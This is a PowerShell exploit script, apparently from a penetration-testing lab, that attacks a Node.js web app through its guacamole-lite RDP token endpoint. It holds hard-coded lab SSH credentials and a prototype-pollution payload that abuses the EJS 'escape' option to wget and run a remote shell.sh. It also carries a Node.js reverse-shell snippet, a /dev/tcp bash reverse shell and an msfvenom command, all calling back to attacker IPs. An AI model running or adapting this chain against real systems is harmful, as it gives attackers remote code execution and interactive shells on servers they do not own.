Import-Module Posh-SSH;
[string]$userName = 'student'
[string]$userPassword = 'studentlab'
[string]$machine = 'chips'
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

$worker = New-SSHSession -ComputerName $machine -Credential $credObject
$worker
$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=ejs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
$result

Write-Output "Allowing application to start up sleeping for 10 seconds ..."
Start-Sleep -Seconds 10

$res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using EJS as Templating Engine -->' | % -process {$_.Matches.Value}
Write-Output "Templating engine: $res"
# connects but drops
$shell = @"
(function(){
    var net = process.mainModule.require('net'),
        cp = process.mainModule.require('child_process'),
        sh = cp.spawn('/bin/bash', []);
    var client = new net.Socket();
    client.connect(4444, '192.168.119.210', function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
"@
# triggers an invalid regular expression flag
$shell = "/bin/bash -i >& /dev/tcp/192.168.119.210/4444 0>&1"
$json_obj = @{
  "connection"= @{
    "type"="rdp";
    "settings"= @{
      "hostname"="rdesktop";
      "username"="abc";
      "password"="abc";
      "port"="3389";
      "security"="any";
      "ignore-cert"="true";
      "client-name"="";
      "console"="false";
      "initial-program"="";
      "__proto__" = @{
        "client" = "true";
        "escape"="function (x) {
          process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.154/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &');
          return x;
        }";
      }
    }
  }
}
# pollute the outputFunctionName variable in ejs
$json = convertto-json $json_obj -depth 4
$res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck
$res_content = ConvertFrom-Json $res.Content
Write-Output "rdp token: $($res_content.token)
"
# The guaclite tunnel is triggered by the /rdp endpoint but it uses window.location.search to populate the rdp token for the guaclite tunnel so we use selenium + headless firefox to "proxy" a connection over the guaclite tunnel.
$status = python trigger-guaclite-tunnel.py --token $res_content.token
Write-Host "Status: $status"

# generate shellcode
msfvenom -p cmd/unix/reverse_bash lhost=192.168.119.154 lport=4444 -f raw -o shell.sh

#The last part would be to visit any page of the web application to activate the shell, seems like this must be done from a browser as well.
#iwr -Uri http://chips/ -SkipHttpErrorCheck
Start-Job -ScriptBlock { python visit-page.py }

Write-Output "Sleep for payload request ..."
Start-Sleep -Seconds 5

# cleanup
Remove-Item shell.sh